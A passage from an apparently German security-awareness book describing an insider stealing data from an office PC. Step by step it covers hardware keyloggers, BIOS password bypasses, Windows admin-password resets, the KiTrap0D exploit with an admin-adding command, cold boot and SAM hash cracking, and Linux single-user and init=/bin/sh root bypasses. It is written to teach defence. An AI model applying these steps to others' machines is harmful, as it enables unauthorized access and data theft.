wie Rachsucht, Neugierde oder Geld dazu gesellt, z\u00e4hlen sie zu den gef\u00e4hrlichsten Angreifern, die es weniger auf Breiten- als Tiefenwirkung abgesehen haben: Informationsgewinnung, Verkaufen von Informationen, Erpressung ihres Arbeitgebers und vieles mehr.\n11.2.4 Normalanwender und PC-Freaks Unsere Aufz\u00e4hlung w\u00e4re nicht vollst\u00e4ndig ohne Ber\u00fccksichtigung dieser Gruppe. Hier halten allerdings die Motive dem zur Verf\u00fcgung stehenden IT-Know-how selten stand. Mit anderen Worten: Diese Gruppe ist weitaus weniger qualifiziert als die anderen Angreifer, von daher sind die m\u00f6glichen Sch\u00e4den oftmals geringer. Es stimmt allerdings bedenklich, dass im Internet gen\u00fcgend Tools zum Download bereitstehen, mit denen man nicht nur seine Mitmenschen \u00e4rgern, sondern durchaus auch semiprofessionell ausspionieren kann, insbesondere dann, wenn das Opfer noch weniger wei\u00df als man selbst. Einem Nachbarn einen Wurm oder Trojaner auf die Platte zu jubeln, ist keine Kunst, wenn der Betreffende weder Virenscanner noch Firewall installiert hat, von ungepatchten Systemen mal ganz abgesehen. Da viele Spionage- und Cracktools auch in regelm\u00e4\u00dfigen Abst\u00e4nden in den PC-Zeitschriften vorgestellt, besprochen und auf CD\n11.2 Die Angreifer\n129\ngeliefert werden, muss sich niemand wundern, wenn sich der Nachbar pl\u00f6tzlich unaufgefordert ins eigene WLAN einklinkt. Hier m\u00f6chten wir Ihnen einige typische F\u00e4lle von Netz- und Rechnerattacken im Detail vorstellen, denn wir glauben, dass konkrete Beispiele am ehesten das Sicherheitsbewusstsein sch\u00e4rfen. Wer einmal gesehen hat, wie Profis T\u00fcren in zwei, drei Minuten \u00f6ffnen, ist viel st\u00e4rker motiviert, \u00fcber eine ordentliche Schlie\u00dfanlage nachzudenken als jemand, der nur dar\u00fcber gelesen hat. Von daher haben wir uns entschlossen, Ihnen konkrete und h\u00e4ufig auch erfolgreiche Einbruchsversuche vorzustellen.\n131\n12 Szenario I: Datenklau vor Ort Ausgangsszenario: Angriffsziel ist Ihr B\u00fcrorechner; einer Ihrer Mitarbeiter f\u00fchlt sich pers\u00f6nlich gekr\u00e4nkt, vermutet eine Intrige und sucht m\u00f6gliche Beweise auf Ihrem Rechner. Das Ziel des Angreifers ist non-destructive, d. h., es sollen einfach nur alle relevanten Daten, z. B. alle Officedokumente, kopiert werden, nach M\u00f6glichkeit ohne verwertbare Einbruchsspuren zu hinterlassen. Sie sollen nicht merken, dass einer hinter Ihrem R\u00fccken den PC durchsucht hat.\n12.1\nZugriff auf Windows-PCs\n12.1.1 Erkunden von Sicherheitsmechanismen Der Angreifer wird zun\u00e4chst versuchen herauszufinden, welche Sicherheitsma\u00dfnahmen Sie einsetzen: Ist zum Rechnerstart ein CMOS-Passwort n\u00f6tig? Wird eine Festplattenverschl\u00fcsselung mit Pre-Boot Authentication eingesetzt? Oder wird die unbefugte Inbetriebnahme durch Tokens, biometrische Sensoren etc. verhindert? Da er vermutlich nicht alle Zeit der Welt f\u00fcr den Einbruchsversuch hat, ist es f\u00fcr ihn wichtig, diese Informationen \u2013 sofern m\u00f6glich \u2013 bereits im Vorfeld zu ermitteln. Zu diesem Zweck k\u00f6nnte er Sie einfach beobachten, wenn Sie sich am Rechner anmelden. Eventuell kann er sogar die benutzten Passw\u00f6rter direkt aussp\u00e4hen, mindestens aber, ob sie kurz oder lang sind, ob Sonderzeichen verwendet werden oder nicht und von welchem Hersteller das BIOS stammt. Obwohl es aus der Mode bzw. in Verruf gekommen ist: Ged\u00e4chtnishilfen bei komplizierten Passw\u00f6rtern, z. B. ein Zettel am Monitor, in der Schreibtischschublade oder unterhalb der Tastatur, sind allesamt M\u00f6glichkeiten, die ein geschickter Angreifer zu seinen Gunsten nutzen kann, um schneller und ohne technischen Aufwand an die ben\u00f6tigten Anmeldedaten zu kommen. Alternativ k\u00f6nnte er Sie auch in ein Gespr\u00e4ch \u00fcber sichere und unsichere Passw\u00f6rter verwickeln und herausbekommen, nach welchen Prinzipien Sie bei der Passwortvergabe vorgehen.\n132\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nSollte Social Engineering nicht funktionieren, wird der Angreifer anders vorgehen. Was in fast allen F\u00e4llen funktioniert, ist ein Angriff mit Namen \u00bbHardware Brute Force\u00ab. Wenn der Angreifer sich l\u00e4ngere Zeit unbeobachtet Ihren Rechner vornehmen kann, ist der Datenklau einfach zu bewerkstelligen. Er wird die Seitenwand des Rechners \u00f6ffnen, das Steuerkabel von der Festplatte abziehen und dort einen USB 2.0 IDE Adapter f\u00fcr SATA/IDE-Festplatten24 anschlie\u00dfen. Mit einem Notebook erfolgt jetzt der Direktzugriff auf Ihren Rechner. Alle nicht verschl\u00fcsselten Bereiche wandern jetzt relativ z\u00fcgig \u00fcber die USB-Schnittstelle auf die Festplatte des Angreifers, der sie dann zu Hause in aller Ruhe auswerten kann. Wir m\u00f6chten Ihnen auch nicht verschweigen, dass diese Angriffstechnik auch gut geeignet ist, Ihnen direkt einen Trojaner zu installieren, Daten zu manipulieren, das System zu besch\u00e4digen und kompromittierende Daten aufzuspielen; die Liste dessen, was der Angreifer machen kann, ist lang. Wenn der Angreifer weniger beherzt vorgehen m\u00f6chte oder weil er f\u00fcrchtet, z. B. bei der Putzkolonne aufzufallen, muss er unter Umst\u00e4nden mehrere H\u00fcrden nehmen, wobei zuerst das CMOS-Passwort zu \u00fcberwinden ist, falls Sie eines gesetzt haben. Sehr simpel und bew\u00e4hrt beim Aussp\u00e4hen der Konto-PIN am Geldautomaten ist der Einsatz einer mobilen Kamera, z. B. getarnt als kultiges Benzinfeuerzeug oder Schreibstift. Viel einfacher kann man nicht an die Logindaten kommen.\n12.1.2 \u00dcberwinden der CMOS-H\u00fcrde F\u00fcr jeden BIOS-Hersteller gibt es umfangreiche Listen mit Masterpassw\u00f6rtern, z. B. unter www.bios-passwort.de. Es ist nat\u00fcrlich nicht so prickelnd, abends allein vor dem PC des Opfers zu sitzen und Passw\u00f6rter durchzuprobieren, zumal bei sehr neuen Rechnern die Masterkeys oft nicht funktionieren. An der Stelle kann man jetzt zum Schraubenzieher greifen, um am Mainboard zu fummeln, z. B. um die Pufferbatterie zu entladen oder den CMOS-Inhalt via Jumper auf Defaultwerte zur\u00fcckzusetzen. Allerdings: Es dauert zu lange, man besch\u00e4digt unter Umst\u00e4nden die Computerplatine, und vor allen Dingen f\u00e4llt es auf. Eindeutig eleganter ist der Einsatz eines Hardware-Keyloggers. Er ist unauff\u00e4llig einzusetzen, l\u00e4sst sich mit PS/2- und USB-Tastaturen verwenden oder kann in diese eingebaut werden. Es ist die Frage, wie viel Aufwand Sie hier treiben wollen.\n24\ngesehen bei www.pearl.de (Katalog S. 66) ab 19,90 \u20ac\n12.1 Zugriff auf Windows-PCs\n133\nBild 12.1: Aufwendig: Einbau eines Tastatur-Keyloggers\nEin klassischer Hardware-Keylogger ab 20 \u20ac erf\u00fcllt hier bestens seinen Zweck. Da wir hier im Wesentlichen nur die Logindaten brauchen, reicht die Speichergr\u00f6\u00dfe 256 KB f\u00fcr unsere Zwecke mehr als aus. Der Keylogger wird einfach zwischen Keyboard- und Geh\u00e4useanschluss gesteckt und f\u00e4llt so gut wie nicht auf. Nach einem Tag kann man ihn ebenso unauff\u00e4llig wieder abziehen. Die darauf gespeicherten Daten k\u00f6nnen jetzt ausgelesen bzw. ausgewertet werden. Es muss allerdings beachtet werden, dass der Keylogger in einer Endlosschleife l\u00e4uft. Ist der Speicherplatz ersch\u00f6pft, werden die ersten Eintr\u00e4ge wieder \u00fcberschrieben. Dazu gibt es oftmals ein im Lieferumfang enthaltenes Programm, den Keylogger-Reader und den dazugeh\u00f6rigen Key. Den individuellen Key braucht man, da sich sonst der Keylogger \u2013 aus Sicherheitsgr\u00fcnden \u2013 nicht auslesen l\u00e4sst. Das Handling ist relativ easy.\n134\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nBild 12.2: Auswertung HW-Keylogger\nIn der Professional-Version werden sogar die gedr\u00fcckten Funktionstasten mit Zeitstempel ausgewiesen, sodass es sehr einfach ist, die Startpassw\u00f6rter herauszubekommen. Die Ger\u00e4te sind im \u00dcbrigen weiterentwickelt worden und k\u00f6nnen das mitgeschnittene Material auch in Echtzeit per Funk \u00fcber den \u00c4ther liefern. Wenn die CMOS-H\u00fcrde genommen ist, kann der Angreifer entscheiden, ob er Ihren PC jetzt mit einer externen Boot-CD (Windows/Linux) hochfahren will, um ihn interessierende Dokumente zu kopieren, oder ob er versucht, das Administratorpasswort zu knacken oder ein zus\u00e4tzliches Konto anzulegen. Wenn es dem Angreifer gelingt, sich als Administrator auf Ihrem PC einzuloggen, hat er nat\u00fcrlich wesentlich mehr Spielraum, als wenn er mittels Boot-CD auf Ihren PC zugreift. Selbst wenn Sie ein besonders vorsichtiger Mensch w\u00e4ren, der die Festplatte(n) mit NTFS formatiert und das Encryption File System (EFS) installiert hat, w\u00fcrde ein eingesetzter Keylogger in Kombination mit einem Passwortcracker (f\u00fcr das Admin-Konto) trotzdem alle Sicherheitsanstrengungen zunichte machen.\n12.1.3 Das Admin-Konto erobern Der n\u00e4chste Schritt, den ein konsequenter Angreifer (auch im Hinblick auf folgende Schritte wie die Installation eines Keyloggers oder von RATs) unternehmen w\u00fcrde, ist die Eroberung des Admin-Kontos. Als Einbruchswerkzeug kommen unterschiedliche\n12.1 Zugriff auf Windows-PCs\n135\nTools in Betracht, wobei hier die PC-Zeitschriften mit ihren CDs \u00bbwertvolle\u00ab Hilfestellung leisten. Sehr h\u00e4ufig wurden in der letzten Zeit Linux-Boot-CDs angeboten, mit denen sich das Admin-Passwort relativ einfach zur\u00fccksetzen l\u00e4sst.\nBild 12.3: Mit einer DOS-Boot-CD das Passwort zur\u00fccksetzen\nNoch einfacher, da hier die gewohnte Windows-Oberfl\u00e4che zur Verf\u00fcgung steht, lassen sich Windows-Passw\u00f6rter mit Password Renew in Kombination mit PE-Builder zur\u00fccksetzen.\nBild 12.4: Passw\u00f6rter zur\u00fccksetzen mit Password Renew\n\u00dcberhaupt ist der PE-Builder nicht nur das ideale Werkzeug f\u00fcr Reparatur- und Wartungsarbeiten am PC, sondern auch eine ausgezeichnete Angriffsplattform. Im Gegensatz zu den schon zitierten Linux-Boot-CDs handelt es sich dabei um ein bootf\u00e4higes, modular erweiterbares Mini-Windows-XP, mit dem sich auf Rechner zugreifen l\u00e4sst, ohne dass man den Systemrestriktionen eines dort aktiven Windows unterliegt. Grunds\u00e4tzlich gibt es mehrere M\u00f6glichkeiten, seine Cracktools zu integrieren: Entweder\n136\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nman benutzt die entsprechenden Plugins f\u00fcr die einschl\u00e4gigen Werkzeuge oder (falls die entsprechenden Tools keine eigenst\u00e4ndige Installationsroutine ben\u00f6tigen) man kopiert sie in ein separates Zielverzeichnis, das dann vom PE-Builder in das ISO-Image eingef\u00fcgt wird.\nBild 12.5: Knacktools als Plugin im PE-Builder\nGegen das R\u00fccksetzen des Administratorpassworts von au\u00dfen k\u00f6nnte man einwenden, dass das Opfer dann relativ schnell merkt, dass es ausspioniert wurde. Die Gefahr ist allerdings geringer, als es im ersten Moment scheint. Denn in den seltensten F\u00e4llen meldet sich ein PC-User mit dem Namen Administrator an; viele wissen gar nicht, dass dieser Account existiert. Nicht untypisch ist folgendes Hilfeersuchen:\nBild 12.6: Administratorpasswort unbekannt\n12.1 Zugriff auf Windows-PCs\n137\nDer User andreasstudent wird sich vermutlich mindestens einen Administratoraccount (unter einem x-beliebigen Namen) eingerichtet haben, hat aber v\u00f6llig vergessen, dass bei der Installation von Windows automatisch ein Benutzerkonto f\u00fcr den Benutzer Administrator angelegt wurde. Wenn jetzt also diesem Admin-Konto durch den Angreifer ein neues Passwort zugeordnet wird, f\u00e4llt das in den wenigsten F\u00e4llen auf25. Am sichersten ist es allerdings, das Passwort einfach nur zu l\u00f6schen. Wie auch immer, in jedem Fall hat der Angreifer jetzt den vollst\u00e4ndigen Zugriff auf den PC des Opfers und kann \u2013 neben sonstigen Manipulationen \u2013 alle ihn interessierenden Dateien auf einen USB-Stick oder eine USB-Festplatte kopieren. Administratorrechte per Mausklick Anfang Januar 2010 wurde von Tavis Ormandy26 ein Exploit f\u00fcr alle 32-Bit-Versionen von Windows vorgestellt. Der Angriff zielt auf die in den 32-Bit-Versionen von Windows standardm\u00e4\u00dfig aktivierte virtuelle DOS-Maschine (NTVDM). Die NTVDM f\u00fchrt DOS- und 16-Bit-Anwendungen aus. Ein \u00bbnormaler\u00ab Nutzer (ohne Admin-Rechte) kann durch einen Mausklick jede beliebige Identit\u00e4t eines Nutzers der Active-DirectoryDom\u00e4ne annehmen. Alles, was man braucht, um sich Admin-Rechte zu erschleichen, ist das KiTrap0D, das zum Beispiel im Metasploit Framework enthalten ist. Wesentliche Bestandteile sind die Dateien Vdmallowed.exe und Vdmexploit.dll. Nach dem Klick auf die EXE-Datei (die allerdings von fast allen aktuellen Virenscannern als Malware inkriminiert ist) startet folgendes Auswahlmen\u00fc:\nBild 12.7: Weichenstellung f\u00fcr das Erschleichen eines Admin-Accounts\nIn der parallel auftauchenden Konsole kann man mit dem Befehl net localgroup administrators /add jedem Konto, mit dem man arbeiten\n25\nAbgesehen von den F\u00e4llen, wo Verzeichnisse/Dateien vom Administrator mit EFS verschl\u00fcsselt wurden: Wird jetzt das Admin-Passwort zur\u00fcckgesetzt, hat der urspr\u00fcngliche Administrator keine M\u00f6glichkeiten mehr, an seine verschl\u00fcsselten Files heranzukommen.\n26\nwww.neohapsis.com\n138\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nm\u00f6chte, alle erforderlichen Rechte erteilen und erlangt dadurch nat\u00fcrlich Zugriff auf alle diesen speziellen Benutzern zugeordneten Dokumente. Remote Zugriff Mit Tools wie dem Remote Commander von Atelier Web l\u00e4sst sich ein Ziel-PC noch einfacher aussp\u00e4hen als mit einem Trojaner. Das Tool ist ein offizielles Netzwerkmanagementtool, das weder von AV-Scannern noch von Desktop Firewalls beanstandet wird. Das Sch\u00f6nste dabei: Sein Einsatz hinterl\u00e4sst keine Spuren, weder vor noch nach dem Aussp\u00e4hen. Die einzige Voraussetzung: Der Angreifer braucht ein Admin-Konto auf dem Ziel-PC und muss den Computernamen kennen. Der Rest ist sozusagen ein Kinderspiel.\nBild 12.8: Beliebiger Zugriff (Import/Export) auf ein fremdes Dateisystem\nIm Prinzip ist fast alles machbar, was auch durch Malware (Trojaner & Co.) m\u00f6glich ist: die komplette Fernsteuerung eines anderen Rechners im Netzwerk. Dateien, Prozesse, Services lassen sich neu anlegen beziehungsweise l\u00f6schen, die Bildschirmaktivit\u00e4ten k\u00f6nnen protokolliert werden, und bei Bedarf kann man auch ein Chat mit dem \u00bbOpfer\u00ab f\u00fchren.\n12.1 Zugriff auf Windows-PCs\n139\nKritische Speicherinhalte auslesen Zus\u00e4tzliche Rechte lassen sich auch \u00fcber eine Linux-CD, einem Firewire-Device/-Kabel und dem Programm Winlockpwn von Adam Boileau27 beschaffen. Das Python-Skript Winlockpwn macht sich den Direktspeicherzugriff (DMA) von Firewire zunutze, um auf einem Zielrechner (Win XP, Vista, Win 7) Speicherinhalte zu manipulieren, unter anderem, um Windows-Passw\u00f6rter auszulesen und neu zu setzen. Der Trick funktioniert auch mit Mac OS. Auf der PacSec-Konferenz 2004 in Tokio konnte demonstriert werden, wie man mit einem via Firewire angeschlossenen iPod auf einem Notebook Bildschirminhalte auslesen beziehungsweise einen kompletten Speicherdump anlegen konnte. Das Auslesen von kritischen Speicherbereichen etwa im Bios Keyboard Buffer28 funktioniert selbst bei verschl\u00fcsselten Festplatten. Erm\u00f6glicht wird das durch einen Designfehler der meisten Verschl\u00fcsselungsprogramme, die nach dem Programmstart den Key im RAM, genauer gesagt im Real-Mode-Speicherbereich (0x041e), nicht \u00fcberschreiben. Hat der Angreifer Zugang oder kann er sich diesen verschaffen, reicht ein simples MemoryDump-Programm, diesen Speicherbereich auszulesen. Eine andere Angriffstechnik auf Festplattenverschl\u00fcsselungsprogramme ist die Cold Boot Attack. Da moderne Speicherbausteine wie DRAMs ihren Speicherinhalt nicht sofort nach dem Ausschalten des Computers verlieren, sondern sukzessive erst Minuten sp\u00e4ter (die Zeit l\u00e4sst sich durch das Behandeln mit K\u00e4ltesprays29 verl\u00e4ngern), k\u00f6nnen diese \u2013 und damit auch die Festplatten-Keys \u2013 sp\u00e4ter extern ausgelesen werden. Noch einfacher l\u00e4sst sich der Hack mit dem McGrew Security RAM Dumper30 bewerkstelligen, der unter anderem als Bootable-CD-Version angeboten wird. Passw\u00f6rter und Hashwerte Was aber, wenn aus bestimmten Gr\u00fcnden dennoch das Originalpasswort f\u00fcr ein Admin-Konto ben\u00f6tigt wird? In diesem Fall muss der Angreifer etwas tiefer in die Toolkiste greifen. Zur Erinnerung: Unter Windows NT 4.0 und Nachfolgern werden die Systempassw\u00f6rter, genauer gesagt ihre Hashwerte, im Windows Security Accounts Manager gespeichert. Die Rede ist von der SAM-Datei, die sich normalerweise im Windows-Verzeichnis \\system32\\config befindet31. Der Zugriff auf das Betriebssystem bzw. den Rechner wird freigegeben, wenn der Hashwert der Logindaten mit ihrem gespeicherten Pendant in der SAM-Datenbank \u00fcbereinstimmt. Das Pikante dabei ist, dass Hashing lange Zeit als sicheres Verfahren galt. Beim Hashen wird ein Klartext nach einem bestimmten Algorithmus (SHA-1, MD-5 etc.) verschl\u00fcsselt. Konkret hat z. B. das Passwort IbiWgugiMaG den Hash-Wert: 34 27 CD E8 EC F9 45 61 98 89 F7 DA 95 C0 B9 B1. Wird jetzt von einem Programm die Passworteingabe IbiWgugiMaG gepr\u00fcft, passiert im Hintergrund nichts anderes, als dass zwei Operationen stattfinden: Die aktuelle\n27\nAnleitung unter http://blog.security4all.be/2008/03/partytricks-winlockpwn-tutorial-or-how.html\n28\nAuf das Jonathan Brossard hinwies, vgl. seinen Vortrag: www.ivizsecurity.com/research/preboot/preboot_whitepaper.pdf\n29\nBei minus 50 Grad Celsius konnten 99 Prozent der Speicherinhalte noch nach 10 Minuten ausgelesen werden, vgl. www.golem.de/0802/57886.html\n30\nwww.mcgrewsecurity.com/tools/msramdmp\n31\nbzw. im Active Directory bei Win 2000-Dom\u00e4nencontrollern (oder h\u00f6her)\n140\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nPassworteingabe wird gehasht und der Wert mit dem hinterlegten Wert in der Datenbank verglichen. Wenn beide Werte \u00fcbereinstimmen, wird der Zugang gew\u00e4hrt, im anderen Falle wird der User abgewiesen. Die Besonderheit dieses Verfahrens besteht darin, dass es neben Brute-Force-Attacken kein (praktikables) Verfahren gibt, um aus 34 27 CD E8 EC F9 45 61 98 89 F7 DA 95 C0 B9 B1 das Passwort abzuleiten. Leider hat Microsoft die Sicherheit der SAM-Datenbank durch einen unsicheren Algorithmus unterh\u00f6hlt. Aus Kompatibilit\u00e4tsgr\u00fcnden kommt neben dem relativ sicheren NTLM-Algorithmus der LanManager-Hash zum Einsatz, bei dem Passw\u00f6rter in zwei H\u00e4lften mit jeweils sieben Zeichen getrennt verschl\u00fcsselt werden. Hei\u00dft das Passwort beispielsweise Schach13579, wandelt es der LanManager-Algorithmus zun\u00e4chst in Gro\u00dfbuchstaben um: SCHACH13579, teilt es dann in zwei H\u00e4lften und f\u00fcllt die L\u00fccken mit Leerzeichen auf. Aus Schach13579 wird jetzt SCHACH1 +3579___, die getrennt verschl\u00fcsselt und dann zusammengesetzt werden. Es ist nat\u00fcrlich klar, dass ein Schl\u00fcssel, der aus 56 + 56 Bit (also 7 Buchstaben \u00e0 8 Bit) besteht, schneller zu knacken ist als ein 128-Bit-Key, insbesondere dann, wenn der Schl\u00fcsselraum hier aus Klein- und Gro\u00dfbuchstaben besteht. Um das Auslesen der Hashwerte zus\u00e4tzlich zu erschweren, hat Microsoft ab 2004 die Kontokennwortinformationen mit der Einf\u00fchrung von Syskey weiter abgesichert: \u00bbDer Hotfix System Key f\u00fcr Windows NT Server 4.0 bietet die M\u00f6glichkeit zum Einsatz von Techniken zu starker Verschl\u00fcsselung. Auf diese Weise k\u00f6nnen die Kontokennwortinformationen, die der Sicherheitskonten-Manager (SAM, Security Account Manager) in der Registrierung speichert, besser gesch\u00fctzt werden. Windows NT Server speichert Benutzerkonteninformationen, einschlie\u00dflich einer Ableitung des Kennworts f\u00fcr das Benutzerkonto, in einem sicheren Bereich der Registrierung; er ist durch Zugriffssteuerung und eine Verschl\u00fcsselungsfunktion gesch\u00fctzt.32\u00ab Gibt man unter Start / Ausf\u00fchren den Befehl Syskey in die Befehlszeile ein, kann man erfahren, ob Syskey installiert ist oder nicht.\nBild 12.9: Verschl\u00fcsselung der Kennwortinformationen mit Syskey\nNichtsdestotrotz gibt es Tools, die auch diese Sicherheitssperre spielend \u00fcberwinden, z. B. das in der Toolrubrik vorgestellte SAMInside. Man muss dem Programm auf Anfrage lediglich mitteilen, wo sich die Registrydateien SAM und SYSTEM befinden, der\n32\nhttp://support.microsoft.com/kb/143475/de\n12.2 Zugriff auf Linux-Rechner\n141\nRest geschieht automatisch. Wir haben es auf einem Rechner mit zwei Win-XP-Installationen getestet und SAMInside auf die nicht aktive Systempartition losgelassen.\nBild 12.10: SAMInside knackt Passw\u00f6rter in wenigen Sekunden\nKurze alphanumerische Passw\u00f6rter knackt das Programm in weniger als einer Sekunde. Wenn man in einer ersten Ann\u00e4herung davon ausgeht, dass 80 % aller Passw\u00f6rter Namen (von Partnern, Haustieren etc.) enthalten, die h\u00f6chstens noch mit dem einen oder anderen Sonderzeichen garniert sind, dann stellt auch das kein wirkungsvolles Hindernis f\u00fcr einen Angreifer dar \u2013 zumal es vorbereitete Passworttabellen (in GigabyteGr\u00f6\u00dfe) gibt, wo sich 99 % selbst komplexer Passw\u00f6rter im Minutenbereich knacken lassen. Wer nun gedacht hat, dass die Redmonder diese L\u00fccke seit Windows XP vielleicht gestopft h\u00e4tten, sieht sich get\u00e4uscht. Mit Elcomsofts System Recovery 2 (ESR) k\u00f6nnen die lokalen Zugangsdaten von Vista-PCs ohne Probleme zur\u00fcckgesetzt werden. Es reicht, mit der ESR-CD das System neu zu booten: same procedure as every windows. Obwohl man Linux-Rechnern gern ein h\u00f6heres Sicherheitsniveau bescheinigt, kommt man an deren Festplatteninhalt in der Regel noch einfacher heran.\n12.2\nZugriff auf Linux-Rechner\nDer Zugriff auf GNU/Linux, ohne dass einem Angreifer das Root-Kennwort bekannt ist, gestaltet sich f\u00fcr Linux-Systeme grunds\u00e4tzlich gleich und ist erschreckend einfach. Da es leichte Unterschiede in Abh\u00e4ngigkeit der verwendeten Distribution gibt, greifen die Autoren zur Vorstellung auf zwei popul\u00e4re Linux-Distributionen zur\u00fcck, in dem Fall auf Red Hat Fedora Linux und Debian GNU/Linux. Das Leersaugen der Festplatte durch Einbindung eines mobilen Rechners (Schritt 1), das Brechen des BIOS-Kennworts oder die Einbindung eines Hardware-Keyloggers (Schritt 2) bieten einem Angreifer nat\u00fcrlich auch im Linux-Umfeld die M\u00f6glichkeit des Datendiebstahls. Wir konzentrieren uns in den folgenden Beispielen auf den soeben im Windows-Umfeld vorgestellten 3. Schritt, der Eroberung des Root-Kontos, dem Pendant zum Administratorkonto unter Windows. Folgende M\u00f6glichkeiten zur\n142\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\n\u00c4nderung des Root-Kennworts (oder zur nachtr\u00e4glichen Errechnung, um keine Spuren zu hinterlassen) sind weit verbreitet: \u2022\nStarten von Linux im Single-User-Mode\n\u2022\nStarten von einem Linux-Boot-Medium (z. B. Knoppix)\n\u2022\nEinbindung der zu kompromittierenden Festplatte in ein Fremdsystem\n12.2.1 Starten von Linux im Single-User-Mode Im Vorfeld bedarf es einer kurzen Erl\u00e4uterung der Art und Weise, wie ein Linux-System gestartet wird. Linux bedient sich unterschiedlicher Systemzust\u00e4nde, die als Runlevel bezeichnet werden. Jedem Runlevel sind bestimmte Systemdienste zugeordnet, welche beim Booten als Prozesse in wohldefinierter Reihenfolge starten. Der niedrigste Systemzustand f\u00fcr Wartungsarbeiten, in dem ausschlie\u00dflich Systemressourcen wie Festplatten oder Dateisysteme aktiv sind, ist der Single-User-Runlevel (oder Single-User-Mode). Unter Windows gibt es einen vergleichbaren Systemzustand, den meisten der Leser als \u00bbAbgesicherter Modus\u00ab im Ged\u00e4chtnis. Beim Single-User-Runlevel besteht bei vielen Distributionen die M\u00f6glichkeit, ohne Kenntnis jeglicher Kennw\u00f6rter auf ein LinuxSystem zuzugreifen und z. B. das Root-Kennwort zu \u00e4ndern oder ein neues Konto einzurichten. Unter Red Hat Fedora Linux bedarf es zur \u00c4nderung des Root-Kennworts der folgenden Schritte: 1. Start des Linux-Systems (Start oder Reboot des Rechners) 2. Wahl des Single-User-Mode im verwendeten Bootloader (beim Bootloader LiLo erfolgt die Eingabe von z. B. Linux single am Bootprompt, bei GRUB die Eingabe von \u00bbe\u00ab zur Editierung der Bootsequenz, die Hinzuf\u00fcgung von single, Best\u00e4tigung mit (Return) und danach die Eingabe von \u00bbb\u00ab zum Booten.\nBild 12.11: Wahl der abzu\u00e4ndernden Bootsequenz am Bootloader GRUB\n12.2 Zugriff auf Linux-Rechner\n143\nBild 12.12: Hinzuf\u00fcgung von single in der Bootsequenz (somit Wahl des Single-UserMode)\n3. Eingabe von passwd am Prompt zur Neuvergabe des Root-Kennworts. 4. Reboot des Rechners, z. B. mit shutdown \u2013r now Beim n\u00e4chsten Systemstart kann sich der Angreifer mittels Eingabe des soeben vergebenen Kennworts beim Root-Konto anmelden. Sollte der Angreifer sein Spiel nicht ganz so offensichtlich treiben wollen, stellt das Hinzuf\u00fcgen weiterer Benutzerkonten nat\u00fcrlich auch einen reizvollen Weg dar, das System zu kompromittieren. Der Weg dazu steht ihm jedenfalls offen.\nBild 12.13: Eingabe von passwd am Prompt zur Neuvergabe des Root-Kennworts\nDer geneigte Leser mag fassungslos \u00fcber scheinbar laxe Schutzmechanismen bei Benutzerkennw\u00f6rtern sein und an der grunds\u00e4tzlichen Sicherheit von Linux zweifeln. Wir k\u00f6nnen die Leser jedoch beruhigen: Linux ist alles andere als unsicher. Es handelt sich aber um eine g\u00e4nzlich andere Philosophie als z. B. bei Microsoft Windows, die mit der Entstehung von Linux und dessen Geschichte zusammenh\u00e4ngt. So stammt Linux aus dem klassischen Serverumfeld. Server befinden sich f\u00fcr gew\u00f6hnlich in klimatisierten, verschlossenen Serverschr\u00e4nken eines gesicherten Serverraums mit Kamera\u00fcberwachung. Die M\u00f6glichkeit des physischen Zugriffs z. B. auf die Konsole ist in dieser gesch\u00fctzten Umgebung im Normalfall nur autorisierten Kr\u00e4ften m\u00f6glich. Folglich besteht nicht grunds\u00e4tzlich die Notwendigkeit, einen Runlevel, der f\u00fcr Wartungsarbeiten vorgesehen ist, mit einem Kennwort vor Eindringlingen zu sch\u00fctzen.\n144\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nDas ist Aufgabe der Infrastruktur, z. B. mit einem Serverschrank. Eine Kennwortsperre w\u00e4re aus Sicht der Verf\u00fcgbarkeit, wenn es im Notfall darum geht, ein verungl\u00fccktes System schnell wieder an den Start zu bekommen, sogar hinderlich. Bedeutender ist jedoch die Erkenntnis, dass die Kompromittierung durch einen Angreifer, wenn dieser erst physischen Zugriff auf ein System nehmen kann, immer erfolgreich sein wird \u2013 und sei es durch die Migration der Datentr\u00e4ger in einen externen Rechner. Sofern derartige Szenarien nicht auszuschlie\u00dfen sind, bedarf es allemal effektiverer Hilfsmittel. Ein st\u00e4rkerer Kennwortschutz b\u00f6te dann auch keine zus\u00e4tzliche Sicherheit, wohl aber weitere Vorkehrungen, wie beispielsweise der Einsatz harter Verschl\u00fcsselung durch dmcrypt/LUKS33. Root-Kennw\u00f6rter \u00fcberwinden Selbstverst\u00e4ndlich gibt es auch Distributionen von GNU/Linux, die \u00bbby default\u00ab deutlich mehr Sicherungsma\u00dfnahmen bieten, so z. B. bei Debian GNU/Linux. Hierbei fordert das System grunds\u00e4tzlich die Eingabe eines Kennworts, auch beim Start des Single-UserMode.\nBild 12.14: Debian GNU/Linux fordert auch im Single-User-Mode die Eingabe des RootKennworts.\nZur \u00c4nderung des Root-Kennworts bedarf es in solch einem Fall einer etwas angepassten erweiterten Vorgehensweise: 1. Start des Linux-Systems (Start oder Reboot des Rechners) 2. Hinzuf\u00fcgung von init=/bin/sh im verwendeten Bootloader (beim Bootloader GRUB erfolgt die Eingabe von \u00bbe\u00ab zur Editierung der Bootsequenz, die Hinzuf\u00fcgung von init=/bin/sh, Best\u00e4tigung mit (Return) und danach die Eingabe von \u00bbb\u00ab zum Booten.\n33\nwww.saout.de/misc/dm-crypt\n12.2 Zugriff auf Linux-Rechner\n145\nBild 12.15: Hinzuf\u00fcgung von init=/bin/sh in der Bootsequenz von Debian GNU/Linux\n3. Start des Linux-Systems (Start oder Reboot des Rechners) 4. Eingabe der folgenden Kommandos am Prompt: mount -n -o remount,rw / (Erneutes Mounten der Laufwerke im Read-Write-Modus, ohne Ber\u00fccksichtung von /etc/mtab) mount -avt nonfs,noproc,nosmbfs (Mounting aller in /etc/fstab erw\u00e4hnten Laufwerke ohne Ber\u00fccksichtigung von fs, proc und smbfs) cd /etc (Wechsel in das Verzeichnis /etc) Bei aktuellen Linux-Distributionen finden sich die Nutzerkonten samt MD5-verschl\u00fcsselten Kennw\u00f6rtern im Verzeichnis /etc in der Datei shadow. Der Eintrag ist vergleichbar mit der folgenden Zeile (bei dem fettgedruckten Teil handelt es sich um das mit dem MD5-Algorithmus verschl\u00fcsselte Kennwort): 